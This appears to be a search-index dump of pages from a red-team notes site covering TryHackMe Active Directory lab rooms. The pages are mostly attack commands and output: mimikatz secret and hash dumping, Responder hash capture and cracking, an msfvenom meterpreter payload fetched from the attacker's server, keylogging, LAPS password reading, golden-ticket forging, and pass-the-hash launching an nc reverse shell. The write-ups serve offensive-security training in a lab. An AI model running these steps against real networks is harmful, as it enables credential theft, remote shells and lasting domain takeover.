badpasswordtime : 11/7/2022 3:13:34 PM distinguishedname : CN=IIS Server,CN=Users,DC=za,DC=tryhackme,DC=loc objectclass : {top, person, organizationalPerson, user} displayname : IIS Server lastlogontimestamp : 11/6/2022 6:03:06 PM userprincipalname : svcIIS@za.tryhackme.loc name : IIS Server objectsid : S-1-5-21-3885271727-2693558621-2658995185-6155 samaccountname : svcIIS codepage : 0 samaccounttype : USER_OBJECT accountexpires : NEVER countrycode : 0 whenchanged : 11/6/2022 6:03:06 PM instancetype : 4 usncreated : 78494 objectguid : 11e42287-0a25-4d73-800d-b62e2d2a2a4b sn : Server lastlogoff : 1/1/1601 12:00:00 AM msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1} objectcategory : CN=Person,CN=Schema,CN=Configuration,DC=tryhackme,DC=loc dscorepropagationdata : 1/1/1601 12:00:00 AM serviceprincipalname : HTTP/svcServWeb.za.tryhackme.loc givenname : IIS lastlogon : 11/7/2022 3:14:12 PM badpwdcount : 0 cn : IIS Server useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION whencreated : 4/27/2022 11:26:21 AM primarygroupid : 513 pwdlastset : 4/29/2022 11:50:25 AM usnchanged : 147565 There is only one user allowed to act as a delegate for other users, namely svcIIS@za.tryhackme.loc . This account is allowed to delegate access to WSMAN/THMSERVER1.za.tryhackme.loc and http/THMSERVER1.za.tryhackme.loc . PS C:\\Users\\t2_alan.riley> Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -like 'svcIIS*'} | Select-Object * Name : thmwinauth Status : OK ExitCode : 0 DesktopInteract : False ErrorControl : Normal PathName : C:\\Windows\\system32.cmd.exe ServiceType : Own Process StartMode : Auto Caption : thmwinauth Description : InstallDate : CreationClassName : Win32_Service Started : False SystemCreationClassName : Win32_ComputerSystem SystemName : THMWRK1 AcceptPause : False AcceptStop : False DisplayName : thmwinauth ServiceSpecificExitCode : 0 StartName : svcIIS@za.tryhackme.loc State : Stopped TagId : 0 CheckPoint : 0 DelayedAutoStart : True ProcessId : 0 WaitHint : 0 PSComputerName : CimClass : root/cimv2:Win32_Service CimInstanceProperties : {Caption, Description, InstallDate, Name...} CimSystemProperties : Microsoft.Management.Infrastructure.CimSystemProperties At system startup, the svcIIS account will auto-start a service which executes C:\\Windows\\system32.cmd.exe . That spawns a command prompt and causes the credential to be cached in memory. Dumping secrets with mimikatz  token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user. lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials. PS C:\\Users\\t2_alan.riley> C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # token::elevate Token Id : 0 User name : SID name : NT AUTHORITY\\SYSTEM 488 {0;000003e7} 1 D 17781 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,21p) Primary -> Impersonated ! * Process Token : {0;002e7dc8} 5 D 3496925 ZA\\t2_alan.riley S-1-5-21-3885271727-2693558621-2658995185-5243 (14g,24p) Primary * Thread Token : {0;000003e7} 1 D 3528379 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,21p) Impersonation (Delegation) mimikatz # lsadump::secrets Domain : THMWRK1 SysKey : a1403e57976b472bce5f231922ca3942 Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 ) Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 ) Domain FQDN : za.tryhackme.loc Policy subsystem is : 1.18 LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463 Secret : $MACHINE.ACC cur/text: 0FFIKa\"c[#L6T>=.s*ZW'Gz04FL&7,\"VjxxhLeXqmI\\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP NTLM:4207d1b7e4b942da2371174b772fdf5e SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db old/text: 0FFIKa\"c[#L6T>=.s*ZW'Gz04FL&7,\"VjxxhLeXqmI\\%Q%c..g?=olZZlnTA#J@;*8+&?neR%>l_W!w&.oz@1MDJHs`&suI rmg,g GQsb%),mlWLo?6$kqP NTLM:4207d1b7e4b942da2371174b772fdf5e SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db Secret : DefaultPassword old/text: vagrant Secret : DPAPI_SYSTEM cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0 full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0 m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f /...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ce606a6171251c67154dde0b1168722e",
    "u": "https://ad.tymyrddin.dev/docs/pivot/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<username>-lateralmovementandpivoting.ovpn --daemon Check PID (you get a number, if not, doesn’t work): sudo ps aux | grep -v grep | grep -i <username>-lateralmovementandpivoting | awk -v FS=' ' '{print $2}' Set your DNS IPv4 to the IP address of the THMDC in the network diagram, and run: sudo systemctl restart NetworkManager Test: nslookup thmdc.za.tryhackme.com Go to http://distributor.za.tryhackme.com/creds and request your credentials for SSH access to thmjmp2 . Login with ssh : $ ssh username@za.tryhackme.com@thmjmp2.za.tryhackme.com",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "629c206db1ac1b6cf9a435dc8000dc6e",
    "u": "https://ad.tymyrddin.dev/docs/enum/cmd",
    "t": "Through Command Prompt ",
    "c": "Through Command Prompt  Run on a domain-joined host to enumerate domain users: net user /domain Run on a domain-joined host to get information about a specific domain user: net user user.name /domain Run on a domain-joined host to enumerate domain groups: net group /domain Run on a domain-joined host to get information about a specific domain group: net group groupName /domain Run on a domain-joined host to show the domain password and account lockout policy: net accounts /domain",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "7a928cd69896bf5d1d529eb9df3d2fc7",
    "u": "https://ad.tymyrddin.dev/docs/harvest/laps",
    "t": "Local Administrator Password Solution ",
    "c": "Local Administrator Password Solution  GPP is a tool that allows administrators to create domain policies with embedded credentials. Once the GPP is deployed, different XML files are created in the SYSVOL folder. SYSVOL is an essential component of Active Directory and creates a shared directory on an NTFS volume that all authenticated domain users can access with reading permission. Once upon a time, the GPP relevant XML files contained a password encrypted using AES-256 bit encryption. At that time, the encryption was good enough until Microsoft somehow published its private key on MSDN . And because Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords. One of the tools to crack the SYSVOL encrypted password is Get-GPPPassword . In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. It introduced the Local Administrator Password Solution (LAPS), which offers a much more secure approach to remotely managing the local administrator password. The new method includes two new attributes ( ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime ) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd . Enumerating for LAPS: Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Users\\thm>dir \"C:\\Program Files\\LAPS\\CSE\" Volume in drive C has no label. Volume Serial Number is A8A4-C362 Directory of C:\\Program Files\\LAPS\\CSE 06/06/2022 01:01 PM <DIR> . 06/06/2022 01:01 PM <DIR> .. 05/05/2021 07:04 AM 184,232 AdmPwd.dll 1 File(s) 184,232 bytes 2 Dir(s) 10,184,249,344 bytes free Switch: C:\\Users\\thm>powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Listing the available PowerShell cmdlets for LAPS: PS C:\\Users\\thm> Get-Command *AdmPwd* CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Find-AdmPwdExtendedRights 5.0.0.0 AdmPwd.PS Cmdlet Get-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Reset-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdAuditing 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdComputerSelfPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdReadPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdResetPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Update-AdmPwdADSchema 5.0.0.0 AdmPwd.PS Finding Users with AdmPwdExtendedRights Attribute: PS C:\\Users\\thm> Find-AdmPwdExtendedRights -Identity THMorg ObjectDN ExtendedRightHolders -------- -------------------- OU=THMorg,DC=thm,DC=red {THM\\LAPsReader} Finding Users belong to THMLAPsReader Group: PS C:\\Users\\thm> net groups \"LAPsReader\" Group name LAPsReader Comment Members ------------------------------------------------------------------------------- bk-admin The command completed successfully. Info: PS C:\\Users\\thm> net user bk-admin User name bk-admin Full Name THM Admin BK Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 6/4/2022 10:33:48 AM Password expires Never Password changeable 6/5/2022 10:33:48 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 6/9/2022 3:47:28 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Domain Admins *LAPsReader *Enterprise Admins The command completed successfully. Switch to bk-admin : PS C:\\Users\\thm> runas /savecred /user:THM.red\\bk-admin cmd.exe Attempting to start cmd.exe as user \"THM.red\\bk-admin\" ... Enter the password for THM.red\\bk-admin: Attempting to start cmd.exe as user \"THM.red\\bk-admin\" ... PS C:\\Users\\thm> Get password: Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32> Get-AdmPwdPassword -ComputerName creds-harvestin ComputerName DistinguishedName Password ExpirationTimestamp ------------ ----------------- -------- ------------------- CREDS-HARVESTIN CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red THMLAPSPassw0rd 2/11/2338 11:05:2... PS C:\\Windows\\system32>",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0d74c40a23f2a3d60c8bf77be687ba09",
    "u": "https://ad.tymyrddin.dev/docs/exploit/users",
    "t": "Exploiting AD users ",
    "c": "Exploiting AD users  Users are, unfortunately, often the weakest link in the security chain. Just think about weak passwords and bad habits, such as granting overly permissive permissions. It would be ignorant and ineffective to overlook this attack surface: Credential Management - How users store their credentials. In AD, this is quite important since users may have multiple sets of credentials and remembering all of them can be a hassle. Keylogging - Often, during exploitation, we need to understand how normal users interact with a system. Together with screengrabs, keylogging can be a useful tool to gain this understanding from an attacker’s perspective. Using our WinRM shell from Kerberos delegation , we do some post-exploit enumeration and come across a .kdbx file in C:\\Users\\trevor.local\\Documents . It’s likely a password vault that’s been encrypted with a strong password. Payload  Generate a meterpreter payload: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.50.57.175 LPORT=443 -f psh -o pwn.ps1 Start a listener: sudo msfconsole msf6> use exploit/multi/handler msf6> set payload windows/x64/meterpreter_reverse_tcp msf6> set LHOST kali-vpn-ip msf6> set LPORT 443 msf6> run Transfer the payload to the target  Start a Python web server on Kali: sudo python3 -m http.server 80 Download the file onto THMSERVER1 via the WinRM session and execute it: powershell.exe -ep bypass Create a web client object: $wc = New-Object Net.WebClient Download pwn.ps1 from Kali and save it in the current directory: $wc. DownloadFile('http://10.50.57.175/pwn.ps1', \"$PWD\\pwn.ps1\") .\\pwn.ps1 Start the keylogger meterpreter > keyscan_start Dump captured keystrokes meterpreter > keyscan_dump Stop the keylogger meterpreter > keyscan_stop Get flag  sudo apt install -y kpcli kpcli # Password is: Imreallysurenoonewillguessmypassword kpcli:/> open PasswordDatabase.kdbx kpcli:/> ls kpcli:/> ls PasswordDatabase/* kpcli:/> show -f -a PasswordDatabase/General/Flag THM{AD.Users.Can.Give.Up.Good.Secrets} kpcli:/> show -f -a PasswordDatabase/General/svcServMan Sup3rStr0ngPass!@",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "bb9c45c228e7f478e7987c9ee2f05fa1",
    "u": "https://ad.tymyrddin.dev/docs/persist/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Connecting to the network  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<some assigned code>-persistingad.ovpn --daemon Check PID (you get a number, if not, does not work): sudo ps aux | grep -v grep | grep -i <some assigned code>-persistingad.ovpn | awk -v FS=' ' '{print $2}' Edit DNS configuration  Set your DNS IPv4 to the IP address of the THMCHILDDC in the network diagram (also add 1.1.1.1 for connections to the internet) and run: sudo systemctl restart NetworkManager Test hostname lookups  $ dig thmdc.za.tryhackme.loc ; <<>> DiG 9.18.7-1-Debian <<>> thmdc.za.tryhackme.loc ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 468 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;thmdc.za.tryhackme.loc. IN A ;; ANSWER SECTION: thmdc.za.tryhackme.loc. 1200 IN A 10.200.60.101 ;; Query time: 40 msec ;; SERVER: 10.200.60.101#53(10.200.60.101) (UDP) ;; WHEN: Mon Nov 07 14:15:34 GMT 2022 ;; MSG SIZE rcvd: 67 And: $ nslookup google.com ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Server: 1.1.1.1 Address: 1.1.1.1#53 Non-authoritative answer: Name: google.com Address: 216.58.214.78 ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Name: google.com Address: 2a00:1450:4007:818::200e Request credentials  Get your credentials from http://distributor.za.tryhackme.loc/creds . Jump in  You can now either login with ssh , for example: $ ssh za.tryhackme.loc\\\\<AD Username>@thmwrk1.za.tryhackme.loc Or by RDP: $ xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'<AD Username>' /p:'<AD Password>'",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "f9020acb7943bcc7fc068fb8d2a10965",
    "u": "https://ad.tymyrddin.dev/docs/breach/relays",
    "t": "Authentication relays ",
    "c": "Authentication relays  In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of the services provided by the network. These services use built-in authentication methods to verify the identity of incoming connections, such as NTLM Authentication used on a web application. This is a dive into NetNTLM authentication used by SMB. Download the password list to be used for cracking the NetNTLM hash. Server Message Block  Used by Windows (and Linux) systems to facilitate file sharing, remote administration, etc. Newer versions of the SMB protocol resolve some vulnerabilities, but companies with legacy systems continue to use older versions. SMB communications are not encrypted and can be intercepted. LLMNR, NBT-NS, and WPAD  NBT-NS and LLMNR are ways to resolve hostnames to IP addresses on the LAN. WPAD is a way for Windows hosts to auto-discover web proxies. These protocols are broadcast on the LAN and can therefore be poisoned, tricking hosts into thinking they’re talking with the intended target. Since these are layer 2 protocols, any time we use Responder to capture and poison requests, we must be on the same LAN as the target. Intercepting NetNTLM challenge  Edit the Responder configuration file and make sure the SMB and HTTP servers are set to On : sudo nano /etc/responder/Responder.conf [Responder Core] ; Servers to start SQL = Off SMB = On RDP = Off Kerberos = On FTP = On POP = Off SMTP = Off IMAP = Off HTTP = On HTTPS = Off DNS = Off LDAP = On DCERPC = Off WINRM = Off Run Responder and wait for the client to connect (A simulated host runs every 30 minutes): sudo responder -I tun0 Crack the hash: echo 'svcFileCopy::ZA:7cc90fae8c5d340d:4A9DCB457EC6B03CB8590632B3022206:010100000000000000CCDAED93A7D801F341996CD2C757EC00000000020008004E00360034004C0001001E00570049004E002D003500310032004B004C0041005A004400450039004F0004003400570049004E002D003500310032004B004C0041005A004400450039004F002E004E00360034004C002E004C004F00430041004C00030014004E00360034004C002E004C004F00430041004C00050014004E00360034004C002E004C004F00430041004C000700080000CCDAED93A7D80106000400020000000800300030000000000000000000000000200000A5ABACBF56562183324A9E5783EA22C522BE71493FF32CF3AAA81CA6A4F7CE880A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00350032002E00330034000000000000000000' > hash john --wordlist=./passwordlist.txt hash",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "68e005fbe33646a25d21d2a3f00dfa93",
    "u": "https://ad.tymyrddin.dev/docs/persist/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Persisting Active Directory What?  Common Active Directory persistence techniques. Why?  To ensure the blue team will not be able to kick us out during a red team exercise. How?  Setup for THM AD Persistence through credentials Persistence through tickets Persistence through certificates Persistence through SID history Persistence through group membership Persistence through ACLs Persistence through GPOs",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "feb315577473173cbba9c06cff96561b",
    "u": "https://ad.tymyrddin.dev/docs/persist/tickets",
    "t": "Persistence through tickets ",
    "c": "Persistence through tickets  Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Golden Tickets  Golden Tickets are forged TGTs. What this means is we bypass steps 1 and 2 of the diagram above, where we prove to the DC who we are. Having a valid TGT of a privileged account, we can now request a TGS for almost any service we want. In order to forge a golden ticket, we need the krbtg account’s password hash so that we can sign a TGT for any user account we want. Some interesting notes about Golden Tickets: By injecting at this stage of the Kerberos process, we don’t need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the krbtg hash, this verification passes and the TGT is declared valid no matter its contents. Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes. Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence. By default, the krbtg account’s password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever. The blue team would have to rotate the krbtg account’s password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services. Rotating the krbtg account’s password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won’t auto-request a new TGT. Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT. We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect. Apart from the krbtg account’s password hash, we only need the domain name, domain SID, and user ID for the person we want to impersonate. If we are in a position where we can recover the krbtg account’s password hash, we would already be in a position where we can recover the other pieces of the required information. Silver Tickets  Silver Tickets are forged TGS tickets. So now, we skip all communication (Step 1-4 in the diagram above) we would have had with the KDC on the DC and just interface with the service we want access to directly. Some interesting notes about Silver Tickets: The generated TGS is signed by the machine account of the host we are targeting. The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the krbtg account’s password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket’s scope is limited to whatever service is targeted on the specific server. Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect. Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host’s local administrators group. The machine account’s password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host’s registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine. While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account. Forging tickets  SSH to THMWRK1 with the unprivileged user account from the distributor. ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc Start a powershell: powershell.exe -ep bypass Get the domain context: PS C:\\Users\\Administrator.ZA> Get-ADDomain AllowedDNSSuffixes : {} ComputersContainer : CN=Computers,DC=za,DC=tryhackme,DC=loc DeletedObjectsContainer : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc DistinguishedName : DC=za,DC=tryhackme,DC=loc DNSRoot : za.tryhackme.loc DomainControllersContainer : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-3885271727-2693558621-2658995185 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc Forest : tryhackme.loc InfrastructureMaster : THMDC.za.tryhackme.loc LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc} LostAndFoundContainer : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc ManagedBy : Name : za NetBIOSName : ZA ObjectClass : domainDNS ObjectGUID : 1fc9e299-da51-4d03-baa0-862c3360c0b2 ParentDomain : tryhackme.loc PDCEmulator : THMDC.za.tryhackme.loc PublicKeyRequiredPasswordRolling : QuotasContainer : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {THMDC.za.tryhackme.loc} RIDMaster : THMDC.za.tryhackme.loc SubordinateReferences : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc} SystemsContainer : CN=System,DC=za,DC=tryhackme,DC=loc UsersContainer : CN=Users,DC=za,DC=tryhackme,DC=loc Start Mimikatz: PS C:\\Users\\Administrator.ZA> C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe Forge a golden ticket: mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt We can specify /admin:ReallyNotLegitAccount...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8f2c85994b8acfe244acb309aff51a2f",
    "u": "https://ad.tymyrddin.dev/docs/pivot/auth",
    "t": "Use of alternate authentication material ",
    "c": "Use of alternate authentication material  NTLM authentication flow  This is for domain authentication. In local authentication, this process only occurs between the client and server, as the server keeps the user's NTLM hash in the SAM If an attacker manages to compromise a machine where a domain user is logged in, the attacker may be able to dump the domain user’s NTLM hash from memory by using a tool like mimikatz or other methods. The attacker could try to crack the hash(es) and user passwords. User sends hash (not password). This allows an attacker to authenticate as a user in certain situations without ever needing to know a password, called pass-the-hash . It does require dumping hashes locally or remotely. Kerberos authentication flow  Ticket Granting Ticket: As long as the session has not lapsed, the user can reuse the TGT as often as needed to request a TGS. Ticket Granting Service: The TGS also has a service session key, and when the SP decrypts the ticket, the SP will have a session key for the user. User Authentication: Deny/Allow Pass-the-Ticket requires both the ticket and the service session key in order to pass a TGS to a service principal to authenticate as a user. A TGT (Golden ticket) allows an attacker to request multiple TGSs (Silver tickets) on behalf of a user. When a user requests a TGS, they send an encrypted timestamp derived from their password. The algorithm used to create this key can be DES (disabled by default on newer Windows installations), RC4 , AES218 , or AES256 , and can perhaps be extracted using mimikatz . If any of these keys are available on the host, then we can try to request a TGT as the user the Pass-the-Key way. The RC4 hash is equal to a user’s NTLM hash. If a users’ NTLM hashes were dumped from LSASS during enumeration on a domain-joined host, and RC4 a valid encryption algorithm, then these are RC4 hashes, which could be used to request a TGT the Overpass-the-Hash way. Cracking hashes  As a result of extracting credentials from a host where we have attained administrative privileges, we might get clear-text passwords, or hashes that can be easily cracked. NTLM hash (NTHash)  These hashes can be obtained by dumping the SAM database or using mimikatz . They are also stored on domain controllers in the NTDS file. These are the hashes that can be used to pass-the-hash . Usually people call this the NTLM hash (or just NTLM), which is misleading, as Microsoft refers to this as the NTHash (at least in some places). Example: B4B9B02E6F09A9BD760F388B67351E2B The algorithm: MD4(UTF-16-LE(password)) UTF-16-LE is the little endian UTF-16 . Windows used this instead of the standard big endian. Cracking: john --format=nt hash.txt hashcat -m 1000 -a 3 hash.txt NTLMv1 (Net-NTLMv1) hash  The NTLM protocol uses the NTHash in a challenge/response between a server and a client. The v1 of the protocol uses both the NT and LM hash, depending on configuration and on what is available. A way of obtaining a response to crack from a client, responder can be used. The value to crack would be the K1 | K2 | K3 . Version 1 is deprecated, but might still be used in some old systems on the network. Example u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c The algorithm: C = 8-byte server challenge, random K1 | K2 | K3 = LM/NT-hash | 5-bytes-0 response = DES(K1,C) | DES(K2,C) | DES(K3,C) Cracking: john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt NTLMv2 (Net-NTLMv2) hash  The new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, but a different algorithm and responses are sent to the server. Can also be captured with responder . This is the Default in Windows since Windows 2000. Example: admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 The algorithm: SC = 8-byte server challenge, random CC = 8-byte client challenge, random CC* = (X, time, CC2, domain name) v2-Hash = HMAC-MD5(NT-Hash, user name, domain name) LMv2 = HMAC-MD5(v2-Hash, SC, CC) NTv2 = HMAC-MD5(v2-Hash, SC, CC*) response = LMv2 | CC | NTv2 | CC* Cracking: john --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt Pass-the-hash  The NTLM challenge sent during authentication can be responded to just by knowing the password hash. Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can pass-the-hash (PtH) for authentication. Assuming NTLMv2, To extract NTLM hashes, use mimikatz to read the local SAM or extract hashes directly from LSASS memory. Extracting NTLM hashes from local SAM will only allow getting hashes from local users on the machine. No domain user hashes will be available. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # lsadump::sam Extracting NTLM hashes from LSASS memory will give any NTLM hashes for local users and any domain user that has recently logged onto the machine. mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::msv The extracted hashes can be used in a PtH attack by using mimikatz to inject an access token for the target user on a reverse shell (or any other command): mimikatz # token::revert mimikatz # sekurlsa::pth /user:<username> /domain:<domainname> /ntlm:6b4a57f67805a663c818106dc0648484 /run:\"c:\\tools\\nc64.exe -e cmd.exe <IP attack machine> 5555\" token::revert reestablishes the original token privileges, because trying to pass-the-hash with an elevated token will not work. Run a reverse listener on the attack machine: nc -lnvp 5555 Running the whoami command on this shell, it will still show the original user from before doing the PtH, but any command run from here will use the credentials thet were injected. Some Linux tools have built-in support for PtH attacks using different protocols. Depending on which services are available, try: Connect to RDP using PtH: xfreerdp /v:<IP target> /u:<domainname>\\\\<username> /pth:<ntlmhash> Connect via psexec using PtH: psexec.py -hashes <ntlmhash> <domainname>/<username>@<IP target> Note: Only the linux version of psexec supports PtH. Connect to WinRM using PtH: evil-winrm -i <IP target> -u <username> -H <ntlmhash> Pass-the-ticket  It may be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz . This usually requires having SYSTEM privileges on the attacked machine: mimikatz # privilege::debug mimikatz # sekurlsa::tickets /export Extracting TGTs will require administrator privileges, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account). We need the ticket and its corresponding session key. Inject the ticket into the current session: mimikatz # kerberos::ptt <ticket> Where ticket looks something like: [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi Injecting tickets in our own session does not require administrator privileges. After this, the tickets will be available for any tools used for lateral movement. To check if the tickets were correctly injected, exit out of the mimikatz session and: za\\user.name@THMJMP2 C:\\> klist Overpass-the-hash/Pass-the-key  This 